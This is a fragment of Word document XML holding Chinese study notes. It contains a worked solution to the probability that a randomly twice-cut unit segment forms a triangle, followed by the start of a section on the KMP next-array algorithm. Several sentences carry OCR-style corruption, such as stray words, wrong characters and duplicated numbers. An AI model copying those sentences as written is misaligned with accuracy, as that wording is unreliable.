        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="23" w:name="bookmark23"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>问这</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>段能组成一个三角形的概率是多少？</w:t>
      </w:r>
      <w:bookmarkEnd w:id="21"/>
      <w:bookmarkEnd w:id="22"/>
      <w:bookmarkEnd w:id="23"/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="240" w:line="337" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>可行域是</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="300" w:line="337" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>x+y+z=l, 0&lt;X, y, Z&lt;1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="60" w:line="330" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="500"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>显然，可行域与我的博客一条长度为1依线段，随机煎两刀，求有一根大于。</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>5的概率 问题一样。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="240" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="500"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>要令三段成为一个三角形，必须满足</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="380" w:line="337" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>x+y&gt;z, x+z&gt;y, y+z&gt;x</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="1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I x_y I &lt;z, I x-z I &lt;y, | y-z I &lt;x</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="345" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="500"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">又 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>x+y+z=l,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">当 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">x+y=z </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>时</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">有 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>z=0. 5 z=0.5z=0. 5,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">因此当 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">x, y, z </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">中有一个大于 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">0. 5 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>时, 就无法成立一个三角形。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="345" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="500"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>当</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>x-y=z</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>时，将</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>x-y=z</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>代入</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>x+y+z=l,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>可得</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">x=0. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>5。因此当</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>x, y, z</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>中有一个大于</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">0. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>5时， 就无法成立一个三角形。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="420" w:line="307" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="500"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>因此解空间刚好与一条长度为1的线段，随机煎两刀，求有一根大于</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>0.5</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>的概率相反。 而一条长度为1的线段</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>随机萸两刀，求有一根大于</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>0.5</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>的概率的概率为</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">0. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>75。因此这3 段能组成一个三角形的概率是多少是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">1-0. 75=0. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>25。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="9"/>
        <w:keepNext/>
        <w:keepLines/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="425"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="420" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="24" w:name="bookmark26"/>
      <w:bookmarkEnd w:id="24"/>
      <w:bookmarkStart w:id="25" w:name="bookmark27"/>
      <w:bookmarkStart w:id="26" w:name="bookmark25"/>
      <w:bookmarkStart w:id="27" w:name="bookmark24"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>kmp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>算法</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>next</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>数组求解过程</w:t>
      </w:r>
      <w:bookmarkEnd w:id="25"/>
      <w:bookmarkEnd w:id="26"/>
      <w:bookmarkEnd w:id="27"/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="60" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>KMP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>算法是用来求一个较长字符串是否包含另一个较短字符串的算法。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">int *next </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">= </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>new int[length];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="60" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>//</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>这里的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Er</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>是被包含的较短字符串，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>length</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>是这个字符串的长度。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>void next(char *str, int *next, int length)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="60" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="48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20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>next [0] = -1;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="337" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="920"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>int k = -1;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="380" w:line="337" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="920"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>for (int q = 1; q &lt;= length-1; q++)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="240" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="1340" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
        <w:sectPr>
          <w:headerReference r:id="rId7" w:type="default"/>
          <w:headerReference r:id="rId8" w:type="even"/>
          <w:footnotePr>
            <w:numFmt w:val="decimal"/>
          </w:footnotePr>
          <w:pgSz w:w="11900" w:h="16840"/>
          <w:pgMar w:top="860" w:right="1704" w:bottom="860" w:left="1689" w:header="432" w:footer="432" w:gutter="0"/>
          <w:cols w:space="720" w:num="1"/>
          <w:rtlGutter w:val="0"/>
          <w:docGrid w:linePitch="360" w:charSpace="0"/>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
